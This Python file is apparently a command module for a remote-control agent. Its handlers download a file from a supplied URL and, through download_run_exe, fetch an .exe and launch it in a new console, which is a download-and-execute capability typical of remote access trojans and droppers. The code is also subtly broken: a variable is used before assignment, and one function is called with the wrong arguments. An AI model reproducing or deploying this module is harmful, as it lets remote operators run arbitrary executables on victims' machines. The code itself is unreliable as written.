import subprocess
import os
import requests
from ..constants import TEMP
from ..commands import Command, CommandArgs, ICommandModule, CommandResult
from pydantic import ValidationError


class DownloadFileHTTPArgs(CommandArgs):
    url: str
    saveTo: str

class DownloadRunExeArgs(DownloadFileHTTPArgs):
    saveTo: str = TEMP


class Download(ICommandModule):
    @staticmethod
    def download_file_http(args: DownloadFileHTTPArgs) -> CommandResult:
        try:
            name = args.url.split("/")[-1]
            saveToName = saveTo.split("\\")[-1]
            if name == saveToName:
                saveTo = saveTo.replace(saveToName, "")
            r = requests.get(args.url)
            with open(os.path.join(saveTo, name), 'wb') as f:
                f.write(r.content) 
            return CommandResult(result=name, success=True)
        except Exception as e:
            return CommandResult(result=f"Error: {e}", success=False)

    @staticmethod
    def download_run_exe(args: DownloadRunExeArgs) -> CommandResult:
        if ".exe" not in args.url:
            return CommandResult(result=f"Error: Invalid URL", success=False)    
        try:
            result = Download.download_file_http(args.url, saveTo = args.saveTo)
            subprocess.Popen(os.path.join(args.saveTo, result[1]), creationflags = subprocess.CREATE_NEW_CONSOLE)
            return CommandResult(result="Success", success=True)    
        except Exception as e:
            return CommandResult(result=f"Error: {e}", success=False)

    def run(self, command: Command, args: CommandArgs) -> CommandResult | None:
        command_func_map = {
            Command.DOWNLOAD_FILE_HTTP : Download.download_file_http,
            Command.DOWNLOAD_RUN_EXE : Download.download_run_exe
        }
        if command not in command_func_map:
            return CommandResult(result=f"Error: Command not found in module.", success=False)    
        
        func = command_func_map[command]
        try:
            return func(args)
        except ValidationError as e:
            return CommandResult(result=f"Error: {e}", success=False)    
        